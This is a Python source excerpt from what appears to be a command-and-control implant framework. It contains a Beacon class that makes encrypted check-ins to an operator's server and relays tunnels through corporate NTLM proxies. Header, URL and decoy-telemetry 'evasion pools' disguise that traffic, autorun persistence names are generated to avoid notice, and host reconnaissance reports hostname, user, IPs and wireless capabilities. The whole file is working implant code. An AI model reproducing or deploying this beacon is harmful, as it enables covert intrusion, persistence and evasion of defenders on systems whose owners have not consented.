        back = threading.Thread(target=self._to_target,
                                args=(relay, noise, peer),
                                name="tunnel-relay-in", daemon=True)
        try:
            back.start()
        except RuntimeError as exc:
            # A one-way proxy is worse than none, so the session ends
            # here: the caller closes both sockets and the operator sees
            # the stream go.
            logger.warning("tunnel: could not start the return direction of "
                           "a relay; closing it: %s", exc)
            return
        try:
            self._to_relay(relay, noise, peer)
        finally:
            # Both descriptors before the join: the other thread may be
            # parked in a read or in a send that TCP backpressure has
            # stopped, and neither wakes on its own.
            _shutdown_socket(relay)
            _shutdown_socket(peer)
            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)

    def _to_relay(self, relay: socket.socket, noise: NoiseSession,
                  peer: socket.socket) -> None:
        """The target's bytes, toward the operator."""
        while True:
            try:
                data = peer.recv(_TUNNEL_CHUNK)
            except OSError:
                return
            if not data:
                # The target is finished, so the session is: whichever
                # direction ends first ends it, because a SOCKS proxy that
                # kept half of one open would leave the operator's tool
                # waiting on a target that has gone.
                return
            try:
                write_frame(relay, noise.encrypt(data))
            except (OSError, ValueError):
                return

    def _to_target(self, relay: socket.socket, noise: NoiseSession,
                   peer: socket.socket) -> None:
        """The operator's bytes, toward the target."""
        try:
            self._to_target_loop(relay, noise, peer)
        finally:
            # This direction ending ends the session, as the other one
            # does: the operator's port closes both of its directions
            # together, so a half-open relay here would carry nothing and
            # would hold a thread until the target happened to close.
            _shutdown_socket(relay)
            _shutdown_socket(peer)

    def _to_target_loop(self, relay: socket.socket, noise: NoiseSession,
                        peer: socket.socket) -> None:
        while True:
            try:
                if not _bytes_waiting(relay):
                    # A FIN between frames: the operator's end is done.
                    # The peek is what keeps that ordinary teardown out of
                    # the warning below, since `read_frame` reports it
                    # with the same exception as a truncated frame.
                    return
                frame = read_frame(relay)
            except OSError:
                return
            except ValueError as exc:
                logger.warning("tunnel: a relay frame was malformed (%s); "
                               "the session is over", exc)
                return
            try:
                data = noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1 again, on the relay this time.
                logger.warning("tunnel: a relay frame did not authenticate "
                               "(%s); the session is over", exc)
                return
            try:
                peer.sendall(data)
            except OSError:
                return

    # ── getting out ──

    def _dial(self, port: int) -> socket.socket:
        """One TCP stream to `self.server:port`, by the first way out.

        A configured proxy, then whatever `ProxyDiscovery` finds, then
        direct. The way that worked last is tried first, so a relay does
        not re-walk the list; when that fails the whole list is walked
        again, because what broke may be the proxy rather than the tunnel.
        """
        attempts = []
        for route in self._routes():
            try:
                return self._dial_route(route, port)
            except OSError as exc:
                attempts.append("%s: %s" % (_route_name(route), exc))
        raise OSError("no way out to %s:%d -- %s"
                      % (self.server, port, "; ".join(attempts)))

    def _routes(self) -> list:
        """The ways out, in the order they are tried. `None` is direct."""
        ordered = []
        with self._lock:
            if self._route_known:
                ordered.append(self._route)
        if self.proxy_mode != "none":
            for route in self._configured_routes() + self._discovered_routes():
                if route not in ordered:
                    ordered.append(route)
        if None not in ordered:
            # Direct is always last and always tried: a proxy that has
            # stopped answering must not take the tunnel with it.
            ordered.append(None)
        return ordered

    def _configured_routes(self) -> list:
        """The proxy this build was told to use, if it was told one."""
        routes = []
        relay = self._ntlm_route()
        if relay is not None:
            routes.append(relay)
        endpoint = _proxy_endpoint(self.proxy_url)
        if endpoint is not None:
            routes.append(endpoint)
        return routes

    def _ntlm_route(self) -> Optional[Tuple[str, int]]:
        """The local NTLM relay's address, starting it if it is configured.

        `_NtlmProxyRelay` is a CONNECT proxy on loopback that performs the
        NTLM handshake against the corporate one, so what this class does
        with it is what it does with any proxy: dial it and write a
        CONNECT. That indirection exists because the NTLM exchange has to
        happen on the same TCP connection as the CONNECT it authorises,
        which is not something a caller of this class could arrange.
        """
        cfg = self._proxy_ntlm
        if not cfg.get("enabled"):
            return None
        with self._lock:
            started = self._ntlm_relay
        if started is not None:
            return "127.0.0.1", started.port
        host = str(cfg.get("host") or "").strip()
        username = cfg.get("username") or ""
        password = cfg.get("password") or ""
        if not host or not username or not password:
            logger.warning("tunnel: proxy NTLM is enabled but its host or "
                           "credentials are missing; skipping the relay")
            return None
        try:
            relay = _NtlmProxyRelay(
                host, int(cfg.get("port") or 8080), username, password,
                domain=cfg.get("domain", ""),
                workstation=cfg.get("workstation", ""))
            relay.start()
        except (OSError, RuntimeError) as exc:
            # A local port it could not bind, or no thread to serve it
            # with. Either way the other ways out are still there.
            logger.warning("tunnel: the NTLM proxy relay would not start "
                           "(%s); falling back", exc)
            return None
        with self._lock:
            if self._stop.is_set():
                # `stop` ran while this relay was binding its port, and
                # took `_ntlm_relay` with it. Installing it now would
                # leave a bound loopback port and an accept thread that
                # nothing is left to stop.
                installed = None
            elif self._ntlm_relay is None:
                self._ntlm_relay = relay
                installed = relay
            else:
                # Another thread won the race; one local port is enough.
                installed = self._ntlm_relay
        if installed is not relay:
            relay.stop()
        if installed is None:
            return None
        return "127.0.0.1", installed.port

    def _discovered_routes(self) -> list:
        """What `ProxyDiscovery` finds, run once per endpoint and cached.

        Once, because discovery shells out, reads the registry and makes
        two DNS lookups for WPAD, and a relay that re-ran all of that per
        session would be slow and loud in equal measure. PAC and WPAD
        entries are skipped: their URL is a script to fetch and evaluate,
        not a proxy a CONNECT can be written to.
        """
        with self._lock:
            cached = self._discovered
        if cached is not None:
            return cached
        routes = []
        try:
            for proxy in ProxyDiscovery().discover_all():
                if proxy.get("is_pac"):
                    continue
                endpoint = _proxy_endpoint(proxy.get("url"))
                if endpoint is not None and endpoint not in routes:
                    routes.append(endpoint)
        except Exception as exc:
            # Discovery runs `gsettings`, reads the Windows registry and
            # resolves names. A host where one of those misbehaves still
            # has a direct route to try.
            logger.debug("tunnel: proxy discovery failed: %s", exc)
        with self._lock:
            self._discovered = routes
        return routes

    def _dial_route(self, route: Optional[Tuple[str, int]],
                    port: int) -> socket.socket:
        """One TCP stream by one way out, remembered if it works."""
        if route is None:
            sock = socket.create_connection((self.server, port),
                                            timeout=self.connect_timeout)
        else:
            sock = socket.create_connection(route,
                                            timeout=self.connect_timeout)
            try:
                self._write_connect(sock, port)
            except OSError:
                _shut_socket(sock)
                raise
        with self._lock:
            self._route, self._route_known = route, True
        return sock

    def _write_connect(self, sock: socket.socket, port: int) -> None:
        """`CONNECT <server>:<port>`, and the proxy's answer to it.

        Written here rather than left to urllib because what follows on
        this socket is Noise and not HTTP: urllib would own the stream.
        The target is the tunnel server's single port, which is the whole
        reason there is only one of them -- a second, unpredictable
        destination port is what a default Squid configuration refuses.
        """
        target = "%s:%d" % (self.server, port)
        sock.settimeout(self.connect_timeout)
        sock.sendall(("CONNECT %s HTTP/1.1\r\nHost: %s\r\n"
                      "Proxy-Connection: Keep-Alive\r\n\r\n"
                      % (target, target)).encode("ascii"))
        status = _proxy_read_line(sock)
        for _ in range(_PROXY_MAX_HEADERS):
            if not _proxy_read_line(sock):
                break
        fields = status.split(" ")
        if len(fields) < 2 or fields[1] != "200":
            # 407 lands here as well as 403: this class has no credentials
            # of its own to offer, and the NTLM relay above is the path
            # for a proxy that wants some.
            raise OSError("the proxy answered %r to CONNECT %s"
                          % (status, target))

    # ── bookkeeping ──

    def _handshake(self, sock: socket.socket, payload: bytes) -> NoiseSession:
        """The initiator's two messages, with `payload` inside the first."""
        sock.settimeout(self.connect_timeout)
        noise = NoiseSession.initiator(self._public, self._psk)
        write_frame(sock, noise.initiate(payload))
        noise.complete(read_frame(sock))
        return noise

    def _egress(self) -> Optional[str]:
        with self._lock:
            if not self._route_known:
                return None
            return _route_name(self._route)

    @staticmethod
    def _crypto_path() -> str:
        """Which AES backend this process has: `openssl` or `pure-python`.

        Read through the module rather than copied at construction, so a
        test that forces the slow backend sees it here too.
        """
        return "pure-python" if _USE_PURE_PYTHON_AES else "openssl"

    def _register_socket(self, sock: socket.socket) -> None:
        with self._lock:
            self._relay_sockets.add(sock)

    def _forget_socket(self, sock: socket.socket) -> None:
        with self._lock:
            self._relay_sockets.discard(sock)

    def _count_session(self, delta: int) -> None:
        with self._lock:
            self._sessions += delta
            if delta > 0:
                self._carried += delta


# ── Evasion pools ──

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

_URL_SUFFIXES = [
    "/collect", "/submit", "/sync", "/push", "/update",
    "/report", "/log", "/track", "/event", "/data",
    "/ping", "/health", "/status", "/check", "/query",
]

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
]

_EXTRA_HEADERS = {
    "Sec-Ch-Ua-Platform": ['"Linux"', '"Windows"', '"macOS"'],
    "Sec-Fetch-Dest": ["empty", "document"],
    "Sec-Fetch-Mode": ["cors", "navigate", "no-cors"],
    "Sec-Fetch-Site": ["same-origin", "cross-site"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Pragma": ["no-cache"],
    "DNT": ["1"],
    "X-Requested-With": ["XMLHttpRequest"],
}

# The shortest check-in this beacon will honour. It has existed since the
# initial commit as a bare `max(10, delay)` inside `_jittered_sleep`, and
# the number was applied to the sleep while the configured value went on
# being reported. The server sizes its freshness windows from that report
# -- `online` under `interval * 2`, `stale` under `interval * 5` -- so an
# interval of 2 meant a 4-second online window against a real 10.1-second
# period, and a perfectly healthy beacon flapped between online and
# offline on every single cycle. Measured in the local environment: four
# agents, "Agent Offline" then "Agent Back Online", for ever.
#
# Raising the value instead of hiding it keeps one number true everywhere:
# what the beacon reports is what it waits.
_MIN_INTERVAL = 10


def _clamp_interval(value) -> float:
    """The interval this beacon will actually honour, from what was asked.

    A value below the floor is raised rather than kept, because the number
    held here is the one reported in every check-in.
    """
    try:
        asked = float(value)
    except (TypeError, ValueError):
        return 300.0
    return asked if asked >= _MIN_INTERVAL else float(_MIN_INTERVAL)


_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]


def _decoy_fields(n: int) -> dict:
    """Generate n random telemetry-like decoy fields."""
    pool = {
        "cpu_pct": lambda: round(random.uniform(2, 90), 1),
        "mem_mb": lambda: random.randint(64, 8192),
        "disk_pct": lambda: round(random.uniform(10, 95), 1),
        "request_count": lambda: random.randint(100, 99999),
        "session_count": lambda: random.randint(1, 5000),
        "error_rate": lambda: round(random.uniform(0, 5), 2),
        "latency_ms": lambda: random.randint(1, 500),
        "uptime_hrs": lambda: round(random.uniform(0.1, 720), 1),
        "queue_depth": lambda: random.randint(0, 1000),
        "cache_hit_pct": lambda: round(random.uniform(50, 99.9), 1),
        "gc_pause_ms": lambda: round(random.uniform(0.1, 50), 2),
        "thread_count": lambda: random.randint(4, 128),
        "conn_pool_active": lambda: random.randint(1, 50),
        "batch_size": lambda: random.randint(10, 500),
    }
    keys = random.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


# ── Persistence names ──
#
# One name per build, generated rather than fixed. The HKCU `Run` value
# and the scheduled task used to be one literal written identically in
# every deployment, so a single burned engagement burned the name for
# every deployment that followed it.
#
# Ordinary administrative vocabulary on purpose: the only place this name
# is ever read is an autorun inventory, where the thing that draws an eye
# is a name that belongs to nothing. The trailing hex is what makes two
# builds differ -- two words alone would collide across an engagement.
_PERSIST_WORDS = ("Device", "Display", "Network", "Printer", "Credential",
                  "Policy", "Session", "Storage", "Telemetry", "Update")
_PERSIST_ROLES = ("Host", "Agent", "Broker", "Helper", "Manager", "Service",
                  "Sync", "Worker")


def persistence_name(entropy: bytes) -> str:
    """One build's autorun entry name, derived from `entropy`.

    Two callers, one shape. The generator passes `os.urandom`, so every
    build it issues carries its own name in its config block. `Beacon`
    passes bytes derived from its implant id when a config carries no
    persistence block at all, because that answer has to be the same on
    every run of one artifact on one host -- otherwise an `unpersist`
    would go looking for a name no `persist` ever wrote.

    Four bytes at least. A caller with fewer thought it was passing
    something random and was not, and the name it would get back would be
    the same one every other such caller got.
    """
    if len(entropy) < 4:
        raise ValueError(
            "persistence_name needs at least 4 bytes of entropy, got %d: "
            "fewer than that is not a per-build name" % len(entropy))
    return "%s%s%s" % (_PERSIST_WORDS[entropy[0] % len(_PERSIST_WORDS)],
                       _PERSIST_ROLES[entropy[1] % len(_PERSIST_ROLES)],
                       entropy[2:4].hex())


class Beacon:
    """C2 beacon with AES-GCM encryption and network evasion."""

    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = _clamp_interval(c2.get("beacon_interval_seconds", 300))
        self.jitter = c2.get("jitter_percent", 20) / 100.0

        https_cfg = c2.get("https", {})
        dns_cfg = c2.get("dns", {})
        smb_cfg = c2.get("smb", {})
        quic_cfg = c2.get("quic", {})

        self.https_enabled = https_cfg.get("enabled", False)
        self.callback_url = https_cfg.get("callback_url", "")
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_enabled = dns_cfg.get("enabled", False)
        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        self.smb_enabled = smb_cfg.get("enabled", False)
        self.smb_pipe_name = smb_cfg.get("pipe_name", "msrpc_6e2f")
        self.smb_server = smb_cfg.get("server", "")

        self.quic_enabled = quic_cfg.get("enabled", False)
        self.quic_server = quic_cfg.get("server", "")

        self._key = decode_key(c2.get("encryption_key"))

        proxy_cfg = c2.get("proxy", {})
        self.proxy_mode = proxy_cfg.get("mode", "auto")
        self.proxy_url = proxy_cfg.get("url", "")
        self._proxy_ntlm_cfg = proxy_cfg.get("ntlm", {})

        self._proxy = ProxyDiscovery()
        self._proxy_session: Optional[_HttpSession] = None
        self._ntlm_relay: Optional[_NtlmProxyRelay] = None

        self._c2_profile = c2.get("c2_profile", {})

        self._implant_id = self._generate_id()
        self._agent_id: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._registered = False
        self._consecutive_failures = 0

        # The tunnel endpoint runs in its own process, not a thread: the
        # beacon is the access and the tunnel is the convenience, so a
        # hung or crashed tunnel must not be able to take the beacon with
        # it. One child at a time, and the record outlives the child so a
        # check-in can confirm a stop and report a crash.
        self._tunnel_proc: Optional[subprocess.Popen] = None
        self._tunnel_origin = ""
        # Retained so `tunnel start` can refuse before it spawns. The
        # child's own refusal goes to a stderr this process sends to
        # DEVNULL, so without this the operator's whole diagnosis is
        # `exit_code: 1` at the next check-in.
        self._tunnel_cfg = c2.get("tunnel")
        # Why there is no block, when a config file had one this host
        # could not use. `tunnel_mode_problem` cannot tell that case from
        # a build generated without a tunnel, and its answer for the
        # latter -- "generate the build with the tunnel enabled" -- is
        # advice nobody can act on when the tunnel came from
        # `configs/raccoon.yaml`. See `beacon_config_from_fallback`.
        self._tunnel_problem = c2.get("tunnel_problem") or ""
        # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
        # thread owns the process, so the two meet over this.
        self._tunnel_lock = threading.Lock()

        # Persistence: one generated name per build, carried in the config
        # block, so `_exec_persist` and `_exec_unpersist` read one value
        # rather than each holding its own copy of a literal. The name an
        # install wrote is by construction the name a removal looks for.
        persist_cfg = c2.get("persistence") or {}
        # No block means a config file rather than a generated build.
        # Derived from the implant id, which is stable for the life of a
        # host, and not from a literal -- a literal here would be the
        # thing this field exists to remove. The id is `_generate_id`'s
        # hex digest, so its own bytes are the entropy: beacon.py's hash
        # call sites are an allow-list in the hardening tests, on purpose,
        # and a name needs no hash of its own.
        self._persist_name = persist_cfg.get("name") or persistence_name(
            bytes.fromhex(self._implant_id[:8]))
        # `path` keeps the payload's path on the autorun command line;
        # `argc` leaves it off and lets the hook in a brought
        # interpreter's own `Lib/` find the payload. Anything else is a
        # build from a newer generator than this artifact, and `path` is
        # the answer that still works without a hook. See
        # `render_sitecustomize` in `software/c2/stagers/startup_hook.py`
        # for why `path` is the default rather than the quieter-looking
        # one.
        gate = persist_cfg.get("gate")
        self._persist_gate = gate if gate in ("path", "argc") else "path"
        self._persist_payload = persist_cfg.get("payload_name") or ""

        # A launcher that runs on the drop-box says so; the Raccoon config on
        # disk is the independent second signal (see _probe_dropbox).
        self._dropbox_hint = bool(c2.get("dropbox", False))
        # Read once: check-ins must not walk sysfs and the routing table.
        self._caps = self._detect_caps()
        self._uplink_iface = self._detect_uplink_iface()

    # ── Identity ──

    def _generate_id(self) -> str:
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ── Crypto ──

    def _encrypt(self, data: dict) -> str:
        # The parameter is a dict and nothing else. Three callers used to
        # hand this an already-serialised value, and both ways of being
        # wrong were invisible: bytes raised TypeError from inside
        # json.dumps and the caller's `except` discarded it, so the SMB and
        # QUIC transports never put a byte on the wire; a str would have
        # been serialised a second time, and the far side would have
        # decrypted a string where it expected a dict, with no error
        # anywhere. The type hint said dict all along -- this makes it true
        # at the boundary, so a future caller finds out immediately.
        # The message names the type and never the value: the argument is
        # plaintext about to be encrypted.
        if not isinstance(data, dict):
            raise TypeError(
                "_encrypt(data) takes a dict, not %s -- pass the mapping, "
                "not a serialised form of it" % type(data).__name__)
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = _aes_gcm_decrypt(self._key, nonce, ct)
        return json.loads(plaintext)

    # ── Evasion helpers ──

    def _evasive_url(self, endpoint: str) -> str:
        base = self.callback_url.rsplit("/", 1)[0]
        profile_block = self._c2_profile.get(
            "http_post" if endpoint == "result" else "http_get", {})
        uris = profile_block.get("uris", [])
        if uris:
            uri = random.choice(uris).lstrip("/")
            return f"{base}/{uri}"
        suffix = random.choice(_URL_SUFFIXES)
        ts = int(time.time() * 1000)
        qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
        return f"{base}/{endpoint}{suffix}{qp}"

    def _evasive_headers(self) -> dict:
        profile_block = self._c2_profile.get("http_get", {})
        if profile_block.get("headers") or self._c2_profile.get("useragent"):
            headers = {}
            ua = self._c2_profile.get("useragent", "")
            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
            headers["Content-Type"] = "application/json"
            for name, value in profile_block.get("headers", {}).items():
                headers[name] = value
            for name, value in profile_block.get("params", {}).items():
                pass
            return headers
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
            "Content-Type": "application/json",
        }
        extra_keys = random.sample(
            list(_EXTRA_HEADERS.keys()),
            random.randint(2, min(4, len(_EXTRA_HEADERS))),
        )
        for k in extra_keys:
            headers[k] = random.choice(_EXTRA_HEADERS[k])
        return headers

    def _post_headers(self) -> dict:
        profile_block = self._c2_profile.get("http_post", {})
        if profile_block.get("headers") or self._c2_profile.get("useragent"):
            headers = {}
            ua = self._c2_profile.get("useragent", "")
            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
            headers["Content-Type"] = "application/json"
            for name, value in profile_block.get("headers", {}).items():
                headers[name] = value
            return headers
        return self._evasive_headers()

    def _wrap_payload(self, data: dict) -> dict:
        encrypted = self._encrypt(data)
        field = random.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(random.randint(4, 10)))
        return dict(sorted(payload.items()))

    def _unwrap_response(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self._decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self._decrypt(v)
                except Exception:
                    continue
        return None

    # ── Capabilities ──

    def _detect_caps(self) -> list:
        """Capabilities advertised to the C2. Never raises: a beacon with an
        incomplete list is better than one that cannot start."""
        caps = ["batch", "smbloot",
                "windows" if platform.system() == "Windows" else "posix"]
        for probe in (self._probe_dropbox, self._probe_sniffer,
                      self._probe_wifi):
            try:
                caps.extend(probe())
            except Exception as e:
                logger.debug("Capability probe %s failed: %s", probe.__name__, e)
        return caps

    @staticmethod
    def _raccoon_config_paths() -> list:
        from software.c2.beacon_standalone import CONFIG_PATHS
        return list(CONFIG_PATHS)

    def _probe_dropbox(self) -> list:
        # The launcher's word counts even if the config lookup below fails.
        if self._dropbox_hint:
            return ["dropbox"]
        # A Raccoon config on disk is what makes a host a drop-box.
        if any(Path(p).exists() for p in self._raccoon_config_paths()):
            return ["dropbox"]
        return []

    def _configured_capture_dir(self) -> Optional[str]:
        import yaml
        for p in self._raccoon_config_paths():
            if Path(p).exists():
                with open(p) as f:
                    cfg = yaml.safe_load(f) or {}
                return (cfg.get("sniffer") or {}).get("capture_dir") or None
        return None

    def _probe_sniffer(self) -> list:
        capture_dir = getattr(self, "capture_dir", None)
        if not capture_dir:
            capture_dir = self._configured_capture_dir()
        if not capture_dir or not Path(capture_dir).is_dir():
            return []
        # The sniffer writes into one subdirectory per capture profile, and
        # may leave only encrypted (.pcap.gpg) files behind.
        if next(Path(capture_dir).rglob("*.pcap*"), None) is not None:
            return ["sniffer"]
        return []

    def _probe_wifi(self) -> list:
        caps = []
        for name in sorted(os.listdir(_SYSFS_NET)):
            iface = os.path.join(_SYSFS_NET, name)
            if not os.path.exists(os.path.join(iface, "wireless")):
                continue
            if "wifi:scan" not in caps:
                caps.append("wifi:scan")
            driver = os.path.join(iface, "device", "driver")
            if (os.path.exists(driver)
                    and os.path.basename(os.path.realpath(driver))
                    in _MONITOR_DRIVERS):
                caps.append("wifi:monitor")
                break
        return caps

    def _detect_uplink_iface(self) -> Optional[str]:
        """Interface carrying the default route, or None when unsure.

        None makes the safety layer refuse every monitor-mode switch, which
        is safe; a wrong answer could let it cut its own channel. So an
        ambiguous table is reported as None rather than guessed at.
        """
        try:
            if platform.system() == "Windows":
                return self._uplink_from_route_print()
            return self._uplink_from_proc_route()
        except Exception as e:
            logger.debug("Uplink detection failed: %s", e)
            return None

    @staticmethod
    def _lowest_metric_iface(candidates: list) -> Optional[str]:
        if not candidates:
            return None
        best = min(m for m, _ in candidates)
        ifaces = {i for m, i in candidates if m == best}
        return ifaces.pop() if len(ifaces) == 1 else None

    def _uplink_from_proc_route(self) -> Optional[str]:
        candidates = []
        with open(_PROC_NET_ROUTE) as f:
            next(f, None)
            for line in f:
                cols = line.split()
                if len(cols) < 8:
                    continue
                iface, dest, flags, metric, mask = (
                    cols[0], cols[1], cols[3], cols[6], cols[7])
                if dest != "00000000" or mask != "00000000":
                    continue
                try:
                    flags_v, metric_v = int(flags, 16), int(metric)
                except ValueError:
                    continue
                # RTF_UP set, RTF_REJECT clear
                if not flags_v & 0x1 or flags_v & 0x200:
                    continue
                candidates.append((metric_v, iface))
        return self._lowest_metric_iface(candidates)

    def _uplink_from_route_print(self) -> Optional[str]:
        # Windows reports the interface by address, not by name, and the
        # router compares this value against interface *names*. An address
        # would therefore never match, so the safety layer would believe the
        # uplink is known and allow a monitor-mode switch on it — the exact
        # failure "no uplink known" exists to prevent, since that case
        # refuses every switch instead.
        #
        # So: nothing is reported here. Correlating the address back to a
        # name needs a second command, on a platform where the monitor-mode
        # path does not exist at all, so the conservative answer costs
        # nothing and the permissive one costs the channel.
        return None

    # ── System info ──

    def _system_info(self) -> dict:
        info = {
            "id": self._implant_id,
            "agent_id": self._agent_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "uptime": self._get_uptime(),
            "interval": self.interval,
            "local_ips": self._get_local_ips(),
            "proxy_mode": self.proxy_mode,
            "caps": list(self._caps),
            "uplink_iface": self._uplink_iface,
        }
        if self._ntlm_relay:
            # Report the real upstream, not the local relay port — the operator
            # cares about which corporate proxy the traffic exits through.
            info["proxy_active"] = f"{self._ntlm_relay.upstream_url} (NTLM: {self._ntlm_relay.identity})"
        elif self._proxy._active_proxy:
            info["proxy_active"] = self._proxy._active_proxy["url"]
        elif self._proxy_session and self._proxy_session.proxies:
            info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")

        # Only when this beacon has started a tunnel child, so the check-in
        # payload of every build that has no tunnel is byte for byte what
        # it was. A child that has died is reported rather than forgotten:
        # that is the only signal an operator gets for a tunnel that
        # crashed, and it is what confirms a stop they asked for.
        tunnel = self._tunnel_status()
        if tunnel is not None:
            info["tunnel"] = tunnel

        if self._c2_profile:
            p = self._c2_profile
            prof: dict = {"active": True}
            if p.get("useragent"):
                prof["useragent"] = p["useragent"]
            get_b = p.get("http_get", {})
            post_b = p.get("http_post", {})
            if get_b.get("uris"):
                prof["get_uris"] = get_b["uris"]
            if post_b.get("uris"):
                prof["post_uris"] = post_b["uris"]
            if get_b.get("headers"):
                prof["get_headers"] = list(get_b["headers"].keys())
            if post_b.get("headers"):
                prof["post_headers"] = list(post_b["headers"].keys())
            if get_b.get("metadata"):
                prof["metadata_config"] = get_b["metadata"]
            if post_b.get("id"):
                prof["id_config"] = post_b["id"]
            prof["jitter"] = int(self.jitter * 100)
            prof["interval"] = self.interval
            info["c2_profile"] = prof
        else:
            info["c2_profile"] = {"active": False}
        return info

    @staticmethod
    def _get_local_ips() -> list:
        ips = []
        try:
            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
                addr = info[4][0]
                if addr not in ips and addr != "127.0.0.1":
                    ips.append(addr)
        except Exception:
            pass
        if not ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ips.append(s.getsockname()[0])
                s.close()
            except Exception:
                pass
        return ips

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    # ── Timing ──

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        # Still a floor, because jitter can push a delay below it: at 100%
        # jitter the draw reaches zero. The difference from before is that
        # `self.interval` can no longer be smaller than the floor, so this
        # clamps the jitter and not the operator's setting.
        time.sleep(max(_MIN_INTERVAL, delay))

    def _backoff_sleep(self):
        delay = min(5 * (1.5 ** self._consecutive_failures), 300)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("Backoff %.1fs (failures=%d)", delay, self._consecutive_failures)
        time.sleep(delay)

    # ── HTTPS transport ──

    def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
        """POST encrypted payload via proxy-aware session; returns decrypted response or None."""
        session = self._proxy_session or _HttpSession()
        hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
        try:
            resp = session.post(
                self._evasive_url(endpoint),
                json_data=self._wrap_payload(data),
                headers=hdrs,
                timeout=30,
            )
            if resp.status_code == 200:
                body = resp.json()
                result = self._unwrap_response(body)
                return result if result else {}
            if resp.status_code == 407:
                logger.warning("Proxy auth required (407) — set proxy credentials in URL")
        except _ProxyError as e:
            logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
            try:
                direct = _HttpSession()
                direct.trust_env = False
                resp = direct.post(
                    self._evasive_url(endpoint),
                    json_data=self._wrap_payload(data),
                    headers=hdrs,
                    timeout=30,
                )
                if resp.status_code == 200:
                    body = resp.json()
                    result = self._unwrap_response(body)
                    return result if result else {}
            except Exception:
                pass
        except Exception as e:
            logger.debug("HTTPS %s failed: %s", endpoint, e)
        return None

    def _register_https(self) -> bool:
        info = self._system_info()
        info["action"] = "register"
        result = self._https_post("register", info)
        if result is not None and result.get("success"):
            self._agent_id = result.get("agent_id", self._implant_id)
            self._registered = True
            logger.info("Registered as %s", self._agent_id)
